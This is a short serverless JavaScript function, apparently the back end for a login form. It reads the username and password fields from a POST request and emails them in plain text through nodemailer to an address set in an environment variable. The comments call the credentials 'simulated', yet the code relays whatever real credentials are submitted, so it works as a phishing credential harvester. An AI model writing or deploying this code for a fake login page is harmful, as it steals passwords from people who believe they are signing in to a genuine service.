const nodemailer = require("nodemailer");

exports.handler = async function (event, context) {
  // Make sure we only allow POST
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: "Method not allowed" }),
    };
  }

  let data;
  try {
    data = JSON.parse(event.body);
  } catch (err) {
    return {
      statusCode: 400,
      body: JSON.stringify({ error: "Invalid JSON" }),
    };
  }

  // Simulated credentials — NEVER use real ones here
  const username = data.username || "test_user";
  const password = data.password || "test_pass123";

  // Create email content
  const subject = `Simulated login submission`;
  const body = `Username: ${username}\nPassword: ${password}`;

  try {
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: process.env.SMTP_PORT,
      secure: Number(process.env.SMTP_PORT) === 465,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });

    await transporter.sendMail({
      from: process.env.SENDER_EMAIL,
      to: process.env.RECEIVER_EMAIL,
      subject,
      text: body,
    });

    return {
      statusCode: 200,
      body: JSON.stringify({
        success: true,
        message: "Simulated credentials sent",
      }),
    };
  } catch (err) {
    return {
      statusCode: 500,
      body: JSON.stringify({
        error: "Email failed to send",
        details: err.message,
      }),
    };
  }
};
